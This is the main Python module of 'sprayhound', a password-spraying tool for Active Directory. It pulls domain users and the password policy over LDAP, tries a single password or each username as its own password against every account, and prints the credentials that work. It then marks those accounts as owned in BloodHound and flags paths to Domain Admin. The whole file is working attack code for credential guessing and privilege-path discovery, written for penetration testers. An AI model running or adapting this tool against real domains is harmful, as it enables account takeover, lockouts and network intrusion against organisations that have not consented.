# Author:
#  Romain Bentz (pixis - @hackanddo)
# Website:
#  https://beta.hackndo.com

import os
from sprayhound.modules.logger import Logger
from sprayhound.modules.ldapconnection import LdapConnection
from sprayhound.modules.neo4jconnection import Neo4jConnection
from sprayhound.modules.credential import Credential
from sprayhound.utils.utils import *


class SprayHound:
    def __init__(self, users, password,
                 ldap_options,
                 neo4j_options,
                 logger_options=Logger.Options(),
                 unsafe=False
                 ):
        self.log = Logger(logger_options)
        self.ldap = LdapConnection(ldap_options, self.log)
        self.neo4j = Neo4jConnection(neo4j_options)
        self.credentials = []
        self.users = users
        self.password = password
        self.unsafe = unsafe

    def run(self):
        if not self.ldap.domain:
            return RetCode(ERROR_LDAP_NOT_FQDN_DOMAIN)

        if not (self.ldap.username and self.ldap.password and self.ldap.host):
            if not self.users:
                return RetCode(ERROR_NO_USER_NO_LDAP)
            else:
                self.log.warn("BEWARE ! You are going to test user/pass without providing a valid domain user")
                self.log.warn("Without a valid domain user, tested account may be locked out as we're not able to determine password policy and bad password count")

                answer = self.log.input("Continue anyway?", ["y", "n"], "n")
                if answer == "n":
                    self.log.warn("Wise master. Bye.")
                    sys.exit(0)
                self.get_credentials()
        else:
            ret = self.ldap.login()
            if not ret.success():
                return ret

            ret = self.ldap.get_password_policy()
            if not ret.success():
                return ret

            ret = self.get_ldap_credentials()
            if not ret.success():
                return ret

        return self.test_credentials()

    def get_credentials(self):
        self.credentials = [Credential(user) for user in self.users]
        for i in range(len(self.credentials)):
            if self.password:
                self.credentials[i].password = self.password
            else:
                self.credentials[i].password = self.credentials[i].samaccountname

    def get_ldap_credentials(self):
        if not self.users:
            ret = self.ldap.get_users(self)
            if not ret.success():
                return ret
        else:
            ret = self.ldap.get_users(self, user=self.users[0], disabled=True)

            if not ret.success():
                return ret

        for i in range(len(self.credentials)):
            if self.password:
                self.credentials[i].set_password(self.password)
            else:
                self.credentials[i].set_password(self.credentials[i].samaccountname)

        return RetCode(ERROR_SUCCESS)

    def test_credentials(self):
        owned = []
        for credential in self.credentials:
            ret = credential.is_valid(self.ldap, self.unsafe)
            if ret.success():
                self.log.success(Logger.highlight("{} : {}").format(credential.samaccountname, credential.password))
                owned.append(credential.samaccountname)
            elif ret == ERROR_LDAP_SERVICE_UNAVAILABLE:
                return ret
            else:
                self.log.debug("{} : {} failed ({})".format(credential.samaccountname, credential.password, ret))

        answer = "n"
        if len(owned) > 1:
            self.log.success("{} user(s) have been owned !".format(len(owned)))
            answer = self.log.input("Do you want to set them as 'owned' in Bloodhound ?", ['y', 'n'], 'y')
        elif len(owned) > 0:
            self.log.success("{} user has been owned !".format(len(owned)))
            answer = self.log.input("Do you want to set it as 'owned' in Bloodhound ?", ['y', 'n'], 'y')

        if answer != "y":
            self.log.warn("Ok, master. Bye.")
            return RetCode(ERROR_SUCCESS)

        for own in owned:
            ret = self.neo4j.set_as_owned(own, self.ldap.domain)
            if not ret.success():
                return ret
            else:
                msg = "Node {} owned!".format(own)
                if self.neo4j.bloodhound_analysis(own, self.ldap.domain).success():
                    msg += " [{}PATH TO DA{}]".format('\033[91m', '\033[0m')
                self.log.success(msg)

        return RetCode(ERROR_SUCCESS)


class CLI:
    def __init__(self):
        self.args = get_args()
        self.log_options = Logger.Options(verbosity=self.args.v)

        self.log = Logger(self.log_options)

        self.ldap_options = LdapConnection.Options(
            self.args.domaincontroller,
            self.args.domain,
            self.args.ldapuser,
            self.args.ldappass,
            self.args.ldapport,
            self.args.ldapssl
        )
        self.neo4j_options = Neo4jConnection.Options(
            self.args.neo4jhost,
            self.args.neo4juser,
            self.args.neo4jpass,
            self.args.neo4jport,
            self.log
        )

        self.users = []
        if self.args.username:
            self.users = [self.args.username]
        elif self.args.userfile:
            if not os.path.isfile(self.args.userfile):
                sprayhound_exit(self.log, RetCode(ERROR_USER_FILE_NOT_FOUND))
            with open(self.args.userfile, 'r') as f:
                self.users = [user.strip().lower() for user in f if user.strip() != ""]
        self.password = self.args.password

    def run(self):
        ret = SprayHound(
            self.users, self.password,
            ldap_options=self.ldap_options,
            neo4j_options=self.neo4j_options,
            logger_options=self.log_options,
            unsafe=self.args.unsafe
        ).run()
        if not ret.success():
            sprayhound_exit(self.log, ret)


def run():
    CLI().run()
